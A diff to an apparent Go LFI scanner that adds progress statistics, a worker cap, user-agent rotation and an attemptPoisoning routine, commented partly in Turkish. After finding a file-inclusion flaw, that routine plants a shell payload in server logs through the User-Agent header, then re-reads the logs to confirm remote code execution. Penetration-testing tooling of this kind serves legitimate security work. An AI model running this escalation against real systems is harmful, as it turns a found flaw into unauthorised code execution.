@@ -4,7 +4,6 @@ import (
 	"crypto/tls"
 	"fmt"
 	"io"
-	"math/rand"
 	"net/http"
 	"net/url"
 	"strings"
@@ -16,17 +15,78 @@ import (
 
 const (
 	// maxResponseBodySize limits memory usage per response to avoid OOM with large payloads.
-	maxResponseBodySize = 2 * 1024 * 1024 // 2 MB
+	maxResponseBodySize = 10 * 1024 * 1024 // 10 MB
+	// maxWorkers limits concurrent workers to prevent DoS on the scanning machine.
+	maxWorkers = 100
 )
+
+// Statistics tracks scan progress
+type Statistics struct {
+	mu            sync.RWMutex
+	TotalTargets  int
+	TotalPayloads int
+	RequestsSent  int
+	Findings      int
+	Errors        int
+	StartTime     time.Time
+}
+
+// NewStatistics creates a new statistics tracker
+func NewStatistics() *Statistics {
+	return &Statistics{
+		StartTime: time.Now(),
+	}
+}
+
+// IncrementRequests increments the request counter
+func (st *Statistics) IncrementRequests() {
+	st.mu.Lock()
+	defer st.mu.Unlock()
+	st.RequestsSent++
+}
+
+// IncrementFindings increments the findings counter
+func (st *Statistics) IncrementFindings() {
+	st.mu.Lock()
+	defer st.mu.Unlock()
+	st.Findings++
+}
+
+// IncrementErrors increments the error counter
+func (st *Statistics) IncrementErrors() {
+	st.mu.Lock()
+	defer st.mu.Unlock()
+	st.Errors++
+}
+
+// SetTargets sets the target and payload counts
+func (st *Statistics) SetTargets(targets, payloads int) {
+	st.mu.Lock()
+	defer st.mu.Unlock()
+	st.TotalTargets = targets
+	st.TotalPayloads = payloads
+}
+
+// Get returns current statistics
+func (st *Statistics) Get() (targets, payloads, requests, findings, errors int, elapsed time.Duration) {
+	st.mu.RLock()
+	defer st.mu.RUnlock()
+	return st.TotalTargets, st.TotalPayloads, st.RequestsSent, st.Findings, st.Errors, time.Since(st.StartTime)
+}
 
 // Options holds the configuration for the scanner.
 type Options struct {
-	Concurrency int
-	Timeout     int
-	Proxy       string
-	UseMutation bool
-	Calibrate   bool
-	Debug       bool
+	Concurrency           int
+	Timeout               int
+	Proxy                 string
+	UseMutation           bool
+	Calibrate             bool
+	Debug                 bool
+	TLSInsecureSkipVerify bool
+	// Log Poisoning & RCE
+	EnableLogPoison bool
+	EnableRCE       bool
+	ShellPayload    string
 }
 
 // Scanner is the main struct that orchestrates the scanning process.
@@ -35,12 +95,23 @@ type Scanner struct {
 	Options       Options
 	baselineCache sync.Map
 	userAgents    []string
+	uaIndex       int
+	uaMu          sync.Mutex
+	stats         *Statistics
+	Progress      chan int // Progress signal channel
 }
 
 // NewScanner creates a new scanner instance with the given options.
 func NewScanner(opts Options) *Scanner {
+	// Enforce maximum worker limit to prevent DoS on scanning machine.
+	if opts.Concurrency <= 0 {
+		opts.Concurrency = 30
+	} else if opts.Concurrency > maxWorkers {
+		opts.Concurrency = maxWorkers
+	}
+
 	transport := &http.Transport{
-		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
+		TLSClientConfig:     &tls.Config{InsecureSkipVerify: opts.TLSInsecureSkipVerify},
 		MaxIdleConnsPerHost: opts.Concurrency,
 	}
 	if opts.Proxy != "" {
@@ -65,7 +136,12 @@ func NewScanner(opts Options) *Scanner {
 			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
 			"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 			"Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
+			"curl/7.88.1",
+			"wget/1.21.3",
 		},
+		uaMu:     sync.Mutex{},
+		stats:    NewStatistics(),
+		Progress: make(chan int, opts.Concurrency*2),
 	}
 }
 
@@ -74,6 +150,9 @@ func (s *Scanner) Start(targets []string, payloads []string, postData, method, t
 	tasks := make(chan engine.Task, s.Options.Concurrency*2)
 	findings := make(chan engine.Finding)
 	var wg sync.WaitGroup
+
+	// Set statistics
+	s.stats.SetTargets(len(targets), len(payloads))
 
 	// Start workers
 	for i := 0; i < s.Options.Concurrency; i++ {
@@ -101,6 +180,15 @@ func (s *Scanner) Start(targets []string, payloads []string, postData, method, t
 func (s *Scanner) worker(tasks <-chan engine.Task, findings chan<- engine.Finding, wg *sync.WaitGroup) {
 	defer wg.Done()
 	for task := range tasks {
+		s.stats.IncrementRequests()
+
+		// Send progress signal
+		select {
+		case s.Progress <- 1:
+		default:
+			// If channel is full, skip to avoid blocking worker
+		}
+
 		var baselineBody string
 		if s.Options.Calibrate {
 			baselineBody = s.getBaseline(task)
@@ -109,6 +197,7 @@ func (s *Scanner) worker(tasks <-chan engine.Task, findings chan<- engine.Findin
 		// doRequest encapsulates the HTTP round-trip so defer is scoped correctly.
 		body, err := s.doRequest(task.Method, task.URL, task.PostData, task.Headers)
 		if err != nil {
+			s.stats.IncrementErrors()
 			if s.Options.Debug {
 				fmt.Printf("[DEBUG] request failed: %v\n", err)
 			}
@@ -116,7 +205,48 @@ func (s *Scanner) worker(tasks <-chan engine.Task, findings chan<- engine.Findin
 		}
 
 		if finding := engine.AnalyzeResponse(body, baselineBody, task); finding != nil {
+			s.stats.IncrementFindings()
 			findings <- *finding
+
+			// Eğer Log Poisoning aktifse, zafiyet sonrası işlemi başlat
+			if s.Options.EnableLogPoison {
+				s.attemptPoisoning(*finding, findings)
+			}
+		}
+	}
+}
+
+// attemptPoisoning tries to achieve RCE via log poisoning after an LFI is found.
+func (s *Scanner) attemptPoisoning(finding engine.Finding, findings chan<- engine.Finding) {
+	if s.Options.Debug {
+		fmt.Printf("[DEBUG] Attempting log poisoning for: %s\n", finding.Task.URL)
+	}
+
+	for _, logPath := range engine.CommonLogPaths {
+		pTask := engine.PoisonTask(finding.Task, logPath, s.Options.ShellPayload)
+
+		// 1. Zehirleme isteğini gönder (User-Agent'a shell ekler)
+		_, err := s.doRequest(pTask.Method, pTask.URL, pTask.PostData, pTask.Headers)
+		if err != nil {
+			continue
+		}
+
+		// 2. Zehirlemenin başarılı olup olmadığını kontrol et
+		// Kaynak kodda shell payload'un çalışıp çalışmadığını test etmek için
+		// log dosyasını tekrar okuyup analiz ediyoruz.
+		checkBody, err := s.doRequest(pTask.Method, pTask.URL, pTask.PostData, nil)
+		if err != nil {
+			continue
+		}
+
+		if engine.CheckPoisonSuccess(checkBody, s.Options.ShellPayload) {
+			s.stats.IncrementFindings()
+			findings <- engine.Finding{
+				Task:      pTask,
+				MatchInfo: "RECOGNIZED: Log Poisoning Success (RCE)",
+			}
+			// Bir tane başarılı poisoning yeterli
+			return
 		}
 	}
 }
@@ -129,10 +259,9 @@ func (s *Scanner) doRequest(method, targetURL, postData string, headers map[stri
 		return "", fmt.Errorf("building request: %w", err)
 	}
 
-	// Randomize User-Agent to reduce WAF fingerprinting.
-	if len(s.userAgents) > 0 {
-		req.Header.Set("User-Agent", s.userAgents[rand.Intn(len(s.userAgents))])
-	}
+	// Get next user agent (thread-safe)
+	req.Header.Set("User-Agent", s.getNextUserAgent())
+
 	// Set Content-Type for POST requests with form data (not JSON).
 	if method == "POST" && postData != "" && !strings.HasPrefix(strings.TrimSpace(postData), "{") {
 		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
@@ -155,6 +284,21 @@ func (s *Scanner) doRequest(method, targetURL, postData string, headers map[stri
 	}
 
 	return string(bodyBytes), nil
+}
+
+// getNextUserAgent returns the next user agent in rotation (thread-safe)
+func (s *Scanner) getNextUserAgent() string {
+	s.uaMu.Lock()
+	defer s.uaMu.Unlock()
+
+	ua := s.userAgents[s.uaIndex]
+	s.uaIndex = (s.uaIndex + 1) % len(s.userAgents)
+	return ua
+}
+
+// GetStatistics returns current scan statistics
+func (s *Scanner) GetStatistics() (int, int, int, int, int, time.Duration) {
+	return s.stats.Get()
 }
 
 // getBaseline fetches the original response body for a URL to use in calibration.
